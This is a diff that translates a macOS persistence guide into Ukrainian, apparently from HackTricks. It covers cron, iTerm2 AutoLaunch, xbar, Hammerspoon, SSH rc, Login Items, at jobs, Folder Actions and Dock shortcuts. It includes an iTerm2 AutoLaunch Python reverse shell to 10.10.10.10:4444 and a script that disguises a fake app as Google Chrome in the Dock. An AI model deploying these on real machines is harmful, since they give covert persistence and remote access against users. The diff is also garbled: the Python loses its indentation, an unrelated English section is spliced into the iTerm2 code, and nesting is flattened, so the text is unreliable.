-There you can find the regular **cron** **jobs**, the **at** **jobs** (not very used) and the **periodic** **jobs** (mainly used for cleaning temporary files). The daily periodic jobs can be executed for example with: `periodic daily`.
-
-To add a **user cronjob programatically** it's possible to use:
-
+Для додавання **користувацького cronjob програмно** можна використовувати:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
 ```
-
 ### iTerm2
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * iTerm2 use to have granted TCC permissions
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* iTerm2 використовується для надання дозволів TCC
 
-#### Locations
+#### Місця
 
 * **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
-  * **Trigger**: Open iTerm
+* **Тригер**: Відкриття iTerm
 * **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
-  * **Trigger**: Open iTerm
+* **Тригер**: Відкриття iTerm
 * **`~/Library/Preferences/com.googlecode.iterm2.plist`**
-  * **Trigger**: Open iTerm
+* **Тригер**: Відкриття iTerm
 
-#### Description & Exploitation
+#### Опис та Використання
 
-Scripts stored in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** will be executed. For example:
-
+Скрипти, збережені в **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**, будуть виконані. Наприклад:
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
 #!/bin/bash
@@ -464,51 +437,60 @@ EOF
 
 chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
 ```
+### MacOS Auto Start Locations
 
-or:
+#### Launch Agents
 
+Launch Agents are used to run commands when a user logs in. They are stored in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.
+
+#### Launch Daemons
+
+Launch Daemons are used to run commands at system startup. They are stored in `/Library/LaunchDaemons/`.
+
+#### Login Items
+
+Login Items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.
+
+#### Startup Items
+
+Startup Items are legacy items that automatically launch when a user logs in. They are stored in `/Library/StartupItems/`.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
 import iterm2,socket,subprocess,os
 
 async def main(connection):
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
-    async with iterm2.CustomControlSequenceMonitor(
-            connection, "shared-secret", r'^create-window$') as mon:
-        while True:
-            match = await mon.async_get()
-            await iterm2.Window.async_create(connection)
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
+async with iterm2.CustomControlSequenceMonitor(
+connection, "shared-secret", r'^create-window$') as mon:
+while True:
+match = await mon.async_get()
+await iterm2.Window.async_create(connection)
 
 iterm2.run_forever(main)
 EOF
 ```
-
-The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** will also be executed:
-
+Скрипт **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** також буде виконаний:
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
+Налаштування iTerm2, розташовані в **`~/Library/Preferences/com.googlecode.iterm2.plist`**, можуть **вказувати команду для виконання** при відкритті терміналу iTerm2.
 
-The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can **indicate a command to execute** when the iTerm2 terminal is opened.
+Це налаштування можна сконфігурувати в налаштуваннях iTerm2:
 
-This setting can be configured in the iTerm2 settings:
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
-
-And the command is reflected in the preferences:
-
+І команда відображається в налаштуваннях:
 ```bash
 plutil -p com.googlecode.iterm2.plist
 {
-  [...]
-  "New Bookmarks" => [
-    0 => {
-      [...]
-      "Initial Text" => "touch /tmp/iterm-start-command"
+[...]
+"New Bookmarks" => [
+0 => {
+[...]
+"Initial Text" => "touch /tmp/iterm-start-command"
 ```
-
-You can set the command to execute with:
+Ви можете встановити команду для виконання за допомогою:
 
 {% code overflow="wrap" %}
 ```bash
@@ -524,27 +506,26 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 {% endcode %}
 
 {% hint style="warning" %}
-Highly probable there are **other ways to abuse the iTerm2 preferences** to execute arbitrary commands.
+Висока ймовірність, що існують **інші способи використання налаштувань iTerm2** для виконання довільних команд.
 {% endhint %}
 
 ### xbar
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But xbar must be installed
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * It requests Accessibility permissions
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але потрібно встановити xbar
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Він запитує дозволи на доступність
 
-#### Location
+#### Місце розташування
 
 * **`~/Library/Application\ Support/xbar/plugins/`**
-  * **Trigger**: Once xbar is executed
+* **Тригер**: Після запуску xbar
 
-#### Description
+#### Опис
 
-If the popular program [**xbar**](https://github.com/matryer/xbar) is installed, it's possible to write a shell script in **`~/Library/Application\ Support/xbar/plugins/`** which will be executed when xbar is started:
-
+Якщо встановлено популярну програму [**xbar**](https://github.com/matryer/xbar), можна написати shell-сценарій в **`~/Library/Application\ Support/xbar/plugins/`**, який буде виконуватися при запуску xbar:
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -552,172 +533,159 @@ touch /tmp/xbar
 EOF
 chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 ```
-
 ### Hammerspoon
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)
+**Опис**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But Hammerspoon must be installed
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * It requests Accessibility permissions
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але Hammerspoon повинен бути встановлений
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Він запитує дозволи на доступність
 
-#### Location
+#### Місце
 
 * **`~/.hammerspoon/init.lua`**
-  * **Trigger**: Once hammerspoon is executed
+* **Тригер**: Після запуску Hammerspoon
 
-#### Description
+#### Опис
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) serves as an automation platform for **macOS**, leveraging the **LUA scripting language** for its operations. Notably, it supports the integration of complete AppleScript code and the execution of shell scripts, enhancing its scripting capabilities significantly.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) служить як платформа автоматизації для **macOS**, використовуючи **мову сценаріїв LUA** для своєї роботи. Зокрема, він підтримує інтеграцію повного коду AppleScript та виконання оболонкових сценаріїв, що значно підвищує його можливості сценаріювання.
 
-The app looks for a single file, `~/.hammerspoon/init.lua`, and when started the script will be executed.
-
+Додаток шукає один файл, `~/.hammerspoon/init.lua`, і при запуску виконується сценарій.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
 hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
 EOF
 ```
-
 ### BetterTouchTool
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But BetterTouchTool must be installed
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * It requests Automation-Shortcuts and Accessibility permissions
+* Корисний для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але BetterTouchTool повинен бути встановлений
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Він запитує дозволи на автоматизацію, ярлики та доступність
 
-#### Location
+#### Місце
 
 * `~/Library/Application Support/BetterTouchTool/*`
 
-This tool allows to indicate applications or scripts to execute when some shortcuts are pressed . An attacker might be able configure his own **shortcut and action to execute in the database** to make it execute arbitrary code (a shortcut could be to just to press a key).
+Цей інструмент дозволяє вказати програми або скрипти для виконання, коли деякі скорочення натиснуті. Атакувальник може налаштувати своє власне **скорочення та дію для виконання в базі даних**, щоб виконати довільний код (скорочення може бути просто натисканням клавіші).
 
 ### Alfred
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But Alfred must be installed
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * It requests Automation, Accessibility and even Full-Disk access permissions
+* Корисний для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але потрібно встановити Alfred
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Він запитує дозволи на автоматизацію, доступність та навіть повний доступ до диска
 
-#### Location
+#### Місце
 
 * `???`
 
-It allows to create workflows that can execute code when certain conditions are met. Potentially it's possible for an attacker to create a workflow file and make Alfred load it (it's needed to pay the premium version to use workflows).
+Це дозволяє створювати робочі процеси, які можуть виконувати код, коли виконуються певні умови. Потенційно атакувальник може створити файл робочого процесу і змусити Alfred завантажити його (потрібно оплатити преміальну версію для використання робочих процесів).
 
 ### SSHRC
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But ssh needs to be enabled and used
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * SSH use to have FDA access
+* Корисний для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але потрібно включити та використовувати ssh
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* SSH використовує доступ до FDA
 
-#### Location
+#### Місце
 
 * **`~/.ssh/rc`**
-  * **Trigger**: Login via ssh
+* **Тригер**: Вхід через ssh
 * **`/etc/ssh/sshrc`**
-  * Root required
-  * **Trigger**: Login via ssh
+* Потрібен root
+* **Тригер**: Вхід через ssh
 
 {% hint style="danger" %}
-To turn ssh on requres Full Disk Access:
-
+Для включення ssh потрібен повний доступ до диска:
 ```bash
 sudo systemsetup -setremotelogin on
 ```
 {% endhint %}
 
-#### Description & Exploitation
+#### Опис & Використання
 
-By default, unless `PermitUserRC no` in `/etc/ssh/sshd_config`, when a user **logins via SSH** the scripts **`/etc/ssh/sshrc`** and **`~/.ssh/rc`** will be executed.
+За замовчуванням, якщо `PermitUserRC no` в `/etc/ssh/sshd_config`, коли користувач **входить через SSH**, скрипти **`/etc/ssh/sshrc`** та **`~/.ssh/rc`** будуть виконані.
 
-### **Login Items**
+### **Елементи входу**
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But you need to execute `osascript` with args
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але вам потрібно виконати `osascript` з аргументами
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Locations
+#### Місця
 
 * **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
-  * **Trigger:** Login
-  * Exploit payload stored calling **`osascript`**
+* **Тригер:** Вхід
+* Використання вразливості для виклику **`osascript`**
 * **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
-  * **Trigger:** Login
-  * Root required
+* **Тригер:** Вхід
+* Потрібні права адміністратора
 
-#### Description
+#### Опис
 
-In System Preferences -> Users & Groups -> **Login Items** you can find **items to be executed when the user logs in**.\
-It it's possible to list them, add and remove from the command line:
-
+У Налаштування системи -> Користувачі та групи -> **Елементи входу** можна знайти **елементи, які виконуються при вході користувача**.\
+Можливо вивести їх, додати та видалити з командного рядка:
 ```bash
 #List all items:
 osascript -e 'tell application "System Events" to get the name of every login item'
 
 #Add an item:
-osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}' 
+osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'
 
 #Remove an item:
-osascript -e 'tell application "System Events" to delete login item "itemname"' 
+osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
+Ці елементи зберігаються в файлі **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 
-These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
+**Елементи входу** також можуть бути вказані за допомогою API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), який збереже конфігурацію в **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
 
-**Login items** can **also** be indicated in using the API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) which will store the configuration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
+### ZIP як елемент входу
 
-### ZIP as Login Item
+(Перевірте попередній розділ про Елементи входу, це розширення)
 
-(Check previos section about Login Items, this is an extension)
+Якщо ви збережете файл **ZIP** як **Елемент входу**, **`Archive Utility`** відкриє його, і якщо ZIP, наприклад, був збережений у **`~/Library`** і містив папку **`LaunchAgents/file.plist`** з задніми дверима, ця папка буде створена (за замовчуванням вона не існує), і plist буде доданий, так що наступного разу, коли користувач знову увійде в систему, **задні двері, вказані в plist, будуть виконані**.
 
-If you store a **ZIP** file as a **Login Item** the **`Archive Utility`** will open it and if the zip was for example stored in **`~/Library`** and contained the Folder **`LaunchAgents/file.plist`** with a backdoor, that folder will be created (it isn't by default) and the plist will be added so the next time the user logs in again, the **backdoor indicated in the plist will be executed**.
-
-Another options would be to create the files **`.bash_profile`** and **`.zshenv`** inside the user HOME so if the folder LaunchAgents already exist this technique would still work.
+Іншою опцією буде створення файлів **`.bash_profile`** та **`.zshenv`** всередині домашнього каталогу користувача, тому якщо папка LaunchAgents вже існує, ця техніка все одно буде працювати.
 
 ### At
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But you need to **execute** **`at`** and it must be **enabled**
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але вам потрібно **виконати** **`at`** і воно повинно бути **увімкнене**
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місцезнаходження
 
-* Need to **execute** **`at`** and it must be **enabled**
+* Потрібно **виконати** **`at`** і воно повинно бути **увімкнене**
 
-#### **Description**
+#### **Опис**
 
-`at` tasks are designed for **scheduling one-time tasks** to be executed at certain times. Unlike cron jobs, `at` tasks are automatically removed post-execution. It's crucial to note that these tasks are persistent across system reboots, marking them as potential security concerns under certain conditions.
+Завдання `at` призначені для **планування одноразових завдань** для виконання в певний час. На відміну від робіт cron, завдання `at` автоматично видаляються після виконання. Важливо зауважити, що ці завдання є постійними після перезавантаження системи, що робить їх потенційними проблемами безпеки в певних умовах.
 
-By **default** they are **disabled** but the **root** user can **enable** **them** with:
-
+За **замовчуванням** вони **вимкнені**, але користувач **root** може **увімкнути** **їх** за допомогою:
 ```bash
 sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
 ```
-
-This will create a file in 1 hour:
-
+Це створить файл через 1 годину:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-
-Check the job queue using `atq:`
-
+Перевірте чергу завдань за допомогою `atq:`
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-
-Above we can see two jobs scheduled. We can print the details of the job using `at -c JOBNUMBER`
-
+Вище ми бачимо дві заплановані задачі. Ми можемо вивести деталі задачі за допомогою `at -c JOBNUMBER`
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -742,19 +710,17 @@ LC_CTYPE=UTF-8; export LC_CTYPE
 SUDO_GID=20; export SUDO_GID
 _=/usr/bin/at; export _
 cd /Users/csaby || {
-	 echo 'Execution directory inaccessible' >&2
-	 exit 1
+echo 'Execution directory inaccessible' >&2
+exit 1
 }
 unset OLDPWD
 echo 11 > /tmp/at.txt
 ```
-
 {% hint style="warning" %}
-If AT tasks aren't enabled the created tasks won't be executed.
+Якщо завдання AT не активовані, створені завдання не будуть виконані.
 {% endhint %}
 
-The **job files** can be found at `/private/var/at/jobs/`
-
+**Файли завдань** можна знайти за шляхом `/private/var/at/jobs/`
 ```
 sh-3.2# ls -l /private/var/at/jobs/
 total 32
@@ -763,46 +729,44 @@ total 32
 -r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
 -rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
 ```
+Ім'я файлу містить чергу, номер завдання та час його запуску. Наприклад, розглянемо `a0001a019bdcd2`.
 
-The filename contains the queue, the job number, and the time it’s scheduled to run. For example let’s take a loot at `a0001a019bdcd2`.
+* `a` - це черга
+* `0001a` - номер завдання у шістнадцятковій системі, `0x1a = 26`
+* `019bdcd2` - час у шістнадцятковій системі. Він представляє хвилини, що минули з початку епохи. `0x019bdcd2` дорівнює `26991826` у десятковій системі. Якщо ми помножимо його на 60, ми отримаємо `1619509560`, що відповідає `GMT: 2021. Квітень 27., Вівторок 7:46:00`.
 
-* `a` - this is the queue
-* `0001a` - job number in hex, `0x1a = 26`
-* `019bdcd2` - time in hex. It represents the minutes passed since epoch. `0x019bdcd2` is `26991826` in decimal. If we multiply it by 60 we get `1619509560`, which is `GMT: 2021. April 27., Tuesday 7:46:00`.
+Якщо ми виведемо файл завдання, ми побачимо, що він містить ту саму інформацію, яку ми отримали за допомогою `at -c`.
 
-If we print the job file, we find that it contains the same information we got using `at -c`.
+### Дії з папками
 
-### Folder Actions
+Опис: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
+Опис: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
-Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але вам потрібно мати можливість викликати `osascript` з аргументами для зв'язку з **`System Events`** для налаштування Дій з папками
+* Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
+* Має деякі базові дозволи TCC, такі як Робочий стіл, Документи та Завантаження
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
-* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
-  * It has some basic TCC permissions like Desktop, Documents and Downloads
-
-#### Location
+#### Місцезнаходження
 
 * **`/Library/Scripts/Folder Action Scripts`**
-  * Root required
-  * **Trigger**: Access to the specified folder
+* Потрібні права адміністратора
+* **Тригер**: Доступ до вказаної папки
 * **`~/Library/Scripts/Folder Action Scripts`**
-  * **Trigger**: Access to the specified folder
+* **Тригер**: Доступ до вказаної папки
 
-#### Description & Exploitation
+#### Опис та Використання
 
-Folder Actions are scripts automatically triggered by changes in a folder such as adding, removing items, or other actions like opening or resizing the folder window. These actions can be utilized for various tasks, and can be triggered in different ways like using the Finder UI or terminal commands.
+Дії з папками - це скрипти, які автоматично викликаються змінами у папці, такими як додавання, видалення елементів або інші дії, наприклад відкриття або зміна розміру вікна папки. Ці дії можуть бути використані для різних завдань і можуть бути викликані різними способами, наприклад, за допомогою інтерфейсу Finder або команд терміналу.
 
-To set up Folder Actions, you have options like:
+Для налаштування Дій з папками у вас є такі варіанти:
 
-1. Crafting a Folder Action workflow with [Automator](https://support.apple.com/guide/automator/welcome/mac) and installing it as a service.
-2. Attaching a script manually via the Folder Actions Setup in the context menu of a folder.
-3. Utilizing OSAScript to send Apple Event messages to the `System Events.app` for programmatically setting up a Folder Action.
-   * This method is particularly useful for embedding the action into the system, offering a level of persistence.
+1. Створення робочого процесу Дій з папками за допомогою [Automator](https://support.apple.com/guide/automator/welcome/mac) та встановлення його як службу.
+2. Прикріплення скрипта вручну через Налаштування Дій з папками у контекстному меню папки.
+3. Використання OSAScript для відправлення повідомлень Apple Event до `System Events.app` для програмного налаштування Дій з папками.
+* Цей метод особливо корисний для вбудовання дії в систему, що надає рівень стійкості.
 
-The following script is an example of what can be executed by a Folder Action:
-
+Наступний скрипт є прикладом того, що може бути виконано за допомогою Дій з папками:
 ```applescript
 // source.js
 var app = Application.currentApplication();
@@ -812,15 +776,11 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-
-To make the above script usable by Folder Actions, compile it using:
-
+Щоб зробити вищезазначений скрипт придатним для дій папки, скомпілюйте його за допомогою:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-
-After the script is compiled, set up Folder Actions by executing the script below. This script will enable Folder Actions globally and specifically attach the previously compiled script to the Desktop folder.
-
+Після компіляції скрипту налаштуйте Дії папки, виконавши наведений нижче скрипт. Цей скрипт увімкне Дії папки глобально і специфічно прикріпить раніше скомпільований скрипт до папки Робочого столу.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events");
@@ -830,16 +790,13 @@ var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
 se.folderActions.push(fa);
 fa.scripts.push(myScript);
 ```
-
-Run the setup script with:
-
+Виконайте налаштування скрипта за допомогою:
 ```bash
 osascript -l JavaScript /Users/username/attach.scpt
 ```
+* Це спосіб реалізації цієї постійності через GUI:
 
-* This is the way yo implement this persistence via GUI:
-
-This is the script that will be executed:
+Це сценарій, який буде виконаний:
 
 {% code title="source.js" %}
 ```applescript
@@ -852,60 +809,56 @@ app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
 {% endcode %}
 
-Compile it with: `osacompile -l JavaScript -o folder.scpt source.js`
+Скомпілюйте його за допомогою: `osacompile -l JavaScript -o folder.scpt source.js`
 
-Move it to:
-
+Перемістіть його до:
 ```bash
 mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
 mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
-
-Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):
+Потім відкрийте програму `Folder Actions Setup`, виберіть **папку, яку ви хочете спостерігати**, і виберіть у вашому випадку **`folder.scpt`** (у моєму випадку я назвав його output2.scp):
 
 <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
 
-Now, if you open that folder with **Finder**, your script will be executed.
+Тепер, якщо ви відкриєте цю папку за допомогою **Finder**, ваш скрипт буде виконаний.
 
-This configuration was stored in the **plist** located in **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** in base64 format.
+Ця конфігурація була збережена в **plist**, розташованому в **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** у форматі base64.
 
-Now, lets try to prepare this persistence without GUI access:
+Тепер спробуємо підготувати цю постійність без доступу до GUI:
 
-1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** to `/tmp` to backup it:
-   * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
-2. **Remove** the Folder Actions you just set:
+1. **Скопіюйте `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** в `/tmp`, щоб зробити резервну копію:
+* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
+2. **Видаліть** Folder Actions, які ви щойно встановили:
 
 <figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Now that we have an empty environment
+Тепер, коли у нас порожня середовище
 
-3. Copy the backup file: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
-4. Open the Folder Actions Setup.app to consume this config: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
+3. Скопіюйте резервний файл: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
+4. Відкрийте програму Folder Actions Setup.app, щоб використати цю конфігурацію: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`
 
 {% hint style="danger" %}
-And this didn't work for me, but those are the instructions from the writeup:(
+І це не спрацювало для мене, але це інструкції з опису:(
 {% endhint %}
 
-### Dock shortcuts
+### Ярлики Dock
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * But you need to have installed a malicious application inside the system
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Але вам потрібно встановити зловмисну програму всередині системи
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місцезнаходження
 
 * `~/Library/Preferences/com.apple.dock.plist`
-  * **Trigger**: When the user clicks on the app inside the dock
+* **Тригер**: Коли користувач клікає на додаток у доку
 
-#### Description & Exploitation
+#### Опис та Використання
 
-All the applications that appear in the Dock are specified inside the plist: **`~/Library/Preferences/com.apple.dock.plist`**
+Усі програми, які з'являються в доку, вказані в plist: **`~/Library/Preferences/com.apple.dock.plist`**
 
-It's possible to **add an application** just with:
-
-{% code overflow="wrap" %}
+Можливо **додати додаток** просто з:
 ```bash
 # Add /System/Applications/Books.app
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
@@ -915,8 +868,7 @@ killall Dock
 ```
 {% endcode %}
 
-Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:
-
+З використанням деяких **соціально-інженерних** методів ви можете **видаавати себе за, наприклад, Google Chrome** всередині дока та фактично виконувати свій власний скрипт:
 ```bash
 #!/bin/sh
 
@@ -942,22 +894,22 @@ cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>CFBundleExecutable</key>
-    <string>Google Chrome</string>
-    <key>CFBundleIdentifier</key>
-    <string>com.google.Chrome</string>
-    <key>CFBundleName</key>
-    <string>Google Chrome</string>
-    <key>CFBundleVersion</key>
-    <string>1.0</string>
-    <key>CFBundleShortVersionString</key>
-    <string>1.0</string>
-    <key>CFBundleInfoDictionaryVersion</key>
-    <string>6.0</string>
-    <key>CFBundlePackageType</key>
-    <string>APPL</string>
-    <key>CFBundleIconFile</key>
-    <string>app</string>
+<key>CFBundleExecutable</key>
+<string>Google Chrome</string>
+<key>CFBundleIdentifier</key>
+<string>com.google.Chrome</string>
+<key>CFBundleName</key>
+<string>Google Chrome</string>
+<key>CFBundleVersion</key>
+<string>1.0</string>
+<key>CFBundleShortVersionString</key>
+<string>1.0</string>
+<key>CFBundleInfoDictionaryVersion</key>
+<string>6.0</string>
+<key>CFBundlePackageType</key>
+<string>APPL</string>
+<key>CFBundleIconFile</key>
+<string>app</string>
 </dict>
 </plist>
 EOF
@@ -969,93 +921,90 @@ cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chr
 defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
 killall Dock
 ```
+### Пікери кольорів
 
-### Color Pickers
